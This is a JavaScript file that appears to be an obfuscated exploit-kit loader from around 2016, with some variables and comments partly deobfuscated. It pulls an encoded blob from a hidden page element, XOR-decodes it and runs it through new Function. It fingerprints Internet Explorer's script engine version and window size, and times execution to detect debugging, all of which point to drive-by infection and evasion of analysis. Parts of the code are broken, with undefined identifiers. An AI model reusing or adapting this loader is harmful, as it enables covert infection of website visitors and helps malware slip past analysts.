var nRXXcuUgLQVUBh;
var PNfNaU, kCfh, BoXo, QII, gFVaUK, eseHzcGkAGiM;
var currentDate = new Date(); // current date?
var IjyDLAKpitvfE;
var AYKbsHqKVlYHn, UKhPqdhzo = true;
var FiAwn = 1;

var Sep092016 = new Date('2016/09/09');
var HLgTS;
kCfh = 'join'
var LiZAqJ = 0;
AYKbsHqKVlYHn = !!HLgTS ? true : (
	function() {
		var i9mk, BcXj;
            if (window['d'] == '' || window['BoXo']) {
                PNfNaU = '';
                wutdorw.scroll = doRsw.alert()
            };
            BcXj = this['document']['getElementById']('oq6iFsbdiAj')['innerHTML'];
            BcXj = BcXj.substr(BcXj.indexOf('>') + 1);
            checkScriptEngineBuildVersionIs545();
            i9mk = v5Z16(BcXj['replace'](/\s/g, ''), 'Tk9SRmhzYUNXWkpvamJtdg=='); // remove whitespace
            BcXj = null;;
            try {
                if (FiAwn == 1) {
                    var U7weQ = new Function(i9mk);
                    U7weQ();
                    FiAwn =2
                } else {
                    var O0fdFD = new Function(i9mk);
                    O0fdFD(i9mk)
                }
            } catch (lol) {}

        });
PNfNaU = 'Tk9SRmhzYUNXWkpvamJtdg==';

function base64_decode(inputb64) {
    var dict = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=', o = '';
    inputb64 = inputb64.replace(/[^A-Za-z0-9\+\/\=]/g, '');
    var t = 0;

    while (t <inputb64.length) {
        var val1 = dict.indexOf(inputb64['charAt'](t++)), val2 = dict.indexOf(inputb64['charAt'](t++)), val3 = dict.indexOf(inputb64['charAt'](t++)), val4 = dict.indexOf(inputb64['charAt'](t++));
        var lmsfd = (val1 << 2) | (val2 >>4), M39fd = ((val2 & 0xf) << 4) | (val3 >> 2), R3kdns = ((val3 & 3) << 6) | val4;
        o += String['fromCharCode'](lmsfd);

        if (val3 != 64) o += String['fromCharCode'](M39fd);
        if (val4 != 64) o += String['fromCharCode'](R3kdns);
    }
    var oa = new Array();
    for (var y = 0; y < o.length; y++) oa[y] = o[y].charCodeAt(0);
    return oa;
}

function isBefore20160909() {
    if (currentDate < Sep092016) {return true;} 
	else {return false;}
}

function checkScriptEngineBuildVersionIs545() {
    var utaNfs = LiZAqJ;
    var xaKfeeqwr = '';
    try {
        if (window['ScriptEngineBuildVersion']() === 545) {
            utaNfs = 0;
        } else {
            utaNfs = 2;
        }
    } catch (e) {
        utaNfs = 4;
    }
    LiZAqJ = utaNfs;
}

function base64_decode_ToIntArray(inputStr) {
    var Maz = '',Jk;
    var fC5Z, JOD =inputStr['length'], Cn0xjh = 0, S7z, bvp1u, bb = 0, FiAwn =47;
    tArr = 'Array';
    var b8c = 255, qTAta = [[65, 91], [97, 123], [48, 58], [43, 44], [47, 48]];
    var oqFyf = [];

    function Kf(fC5Z, Cn0xjh) {
        return fC5Z >>> Cn0xjh;
    };
    for (z in qTAta) {
        for (Jk = qTAta[z][0]; Jk < qTAta[z][1]; Jk++) {
            oqFyf.push(String['fromCharCode'](Jk))
        }
    }
    var yVS = {};
    for (Jk = 0; Jk < 64; Jk++) {
        yVS[oqFyf[Jk]] = Jk
    }
    for (bvp1u = 0; bvp1u < JOD; bvp1u++) {
        S7z = yVS[inputStr['charAt'](bvp1u)];
        Cn0xjh = (Cn0xjh << 6) + S7z;
        bb += 6;
        while (bb >= 8) {
            ((fC5Z = Kf(Cn0xjh, bb -= 8) & b8c) || bvp1u < JOD - 2) && (Maz += String['fromCharCode'](fC5Z))
        }
    }
    oqFyf = null;
    var MW1Hpa =
        (
            function(FiAwn, Aj) {
                var Maz = [];
                for (var Jk = 0; Jk < FiAwn.length; Jk++) Maz['pu' + 'sh'](Aj(FiAwn[Jk]));
                return Maz;
            }
        );
    var BcXj = MW1Hpa(Maz.split(""), (
        function(S7z) {
            var FiAwn = 0;
            return S7z['charCodeAt'](FiAwn);
        }));
    return BcXj;
}

function v5Z16(Fu, ya4o) {
    var R$FBC = new Array();
    var DM7w7I = LiZAqJ;
    if (!DM7w7I) {
        if (window && (!window[ 'outerWidth'] || window['outerWidth'] < 1280)) {
            DM7w7I = 1;
        } else {
            var IhUgy = new Date();
            DM7w7I = (IhUgy - currentDate > 100) ? 3 : 0 // anti debugging check
        }
    }
    var fC5Z = base64_decode(Fu);
    var S7z = base64_decode_ToIntArray(ya4o); //empty string will give empty array
    for (var Ssa = 0; Ssa < fC5Z.length; Ssa++) {
        var bvp1u = fC5Z[Ssa];
        if (S7z.length < 0) {
            bvp1u = 1
        }
        if (S7z.length > 0) bvp1u ^= S7z[DM7w7I];
        if (!isBefore20160909()) {
            (DM7w7I++) % 7
        };
        R$FBC[Ssa] = bvp1u
    }
    var msl = R$FBC['length'], qXgdUv = "";
    for (var Jk = 0; Jk < msl; Jk++) {
        var S7z = R$FBC[Jk];
        qXgdUv += String['fromCharCode'](S7z)
    }
    return qXgdUv;
};

var sTAOtHoXuO;
var VoxpI;
var fBtpJkk = "";
sTAOtHoXuO = "AYKbsHqKVlYHn";
window[sTAOtHoXuO]()